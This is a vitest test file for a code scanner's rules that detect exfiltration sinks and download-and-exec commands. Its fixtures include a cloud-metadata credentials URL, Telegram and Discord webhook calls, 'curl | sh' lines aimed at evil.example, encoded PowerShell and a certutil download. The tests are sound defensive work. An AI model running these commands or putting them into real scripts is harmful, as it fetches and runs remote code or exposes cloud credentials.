import { describe, expect, it } from 'vitest'
import { scan } from '../lib/scanner-bin/engine.js'
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

function codeRequest(overrides: Partial<ScanRequest>): ScanRequest {
  return { kind: 'code', language: 'js', runtime: 'host', ...overrides }
}

function findingOf(report: { findings: Finding[] }, rule: string, severity?: string): Finding | undefined {
  return report.findings.find(f => f.rule === rule && (severity === undefined || f.severity === severity))
}

function withTmp(files: Record<string, string>, fn: (dir: string) => void): void {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r13r14-'))
  for (const [name, content] of Object.entries(files)) {
    writeFileSync(join(dir, name), content)
  }
  try {
    fn(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

describe('R13 network-exfil: hardcoded exfiltration sinks in string literals', () => {
  it('telegram bot webhook literal → R13 high, verdict suspicious', () => {
    const res = scan(codeRequest({ code: "fetch('https://api.telegram.org/bot123456:ABC/sendMessage')" }))
    expect(res.ok).toBe(true)
    const r = res.report!
    const r13 = findingOf(r, 'R13', 'high')
    expect(r13).toBeDefined()
    expect(r13!.message).toContain('Telegram')
    expect(r.verdict).toBe('suspicious')
  })

  it('cloud metadata endpoint → R13 high (IAM exfil surface)', () => {
    const res = scan(codeRequest({ code: "http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')" }))
    expect(res.ok).toBe(true)
    const r13 = findingOf(res.report!, 'R13', 'high')
    expect(r13).toBeDefined()
    expect(r13!.message).toContain('云元数据')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('.onion destination → R13 high', () => {
    const res = scan(codeRequest({ code: "const url = 'http://abc123.onion/payload'" }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13', 'high')).toBeDefined()
  })

  it('clean code without sinks → no R13, verdict clean', () => {
    const res = scan(codeRequest({ code: 'export const add = (a: number, b: number) => a + b' }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
    expect(res.report!.verdict).toBe('clean')
  })

  it('R13 toggle off suppresses findings', () => {
    const res = scan(codeRequest({ code: "fetch('https://discord.com/api/webhooks/1/2')", rules: { R13: false } }))
    expect(res.ok).toBe(true)
    expect(findingOf(res.report!, 'R13')).toBeUndefined()
    expect(res.report!.verdict).toBe('clean')
  })
})

describe('R14 non-JS scripts: download-and-exec primitives in shipped script files', () => {
  it('curl|sh in a .sh file → R14 high, verdict suspicious', () => {
    withTmp({ 'setup.sh': '#!/bin/sh\ncurl -fsSL http://evil.example/x.sh | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'setup.sh')] })
      expect(res.ok).toBe(true)
      const r14 = findingOf(res.report!, 'R14', 'high')
      expect(r14).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })
  })

  it('encoded powershell in a .ps1 file → R14 high', () => {
    withTmp({ 'install.ps1': 'powershell -enc SQBFAFgA' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'install.ps1')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })

  it('benign shell script → no R14, verdict clean', () => {
    withTmp({ 'setup.sh': '#!/bin/sh\necho hello\ncp a b\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'setup.sh')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14')).toBeUndefined()
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('generic target downgrades R14 to info (verdict clean)', () => {
    withTmp({ 'x.sh': 'curl http://e.com/x | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'x.sh')], targetKind: 'generic' })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'info')).toBeDefined()
      expect(res.report!.verdict).toBe('clean')
    })
  })

  it('R14 toggle off suppresses findings', () => {
    withTmp({ 'x.sh': 'curl http://e.com/x | sh\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'x.sh')], rules: { R14: false } })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14')).toBeUndefined()
    })
  })

  it('download-exec in a .bat file is also caught', () => {
    withTmp({ 'go.bat': 'certutil -urlcache -f http://e.com/x.exe x.exe\n' }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'go.bat')] })
      expect(res.ok).toBe(true)
      expect(findingOf(res.report!, 'R14', 'high')).toBeDefined()
    })
  })
})
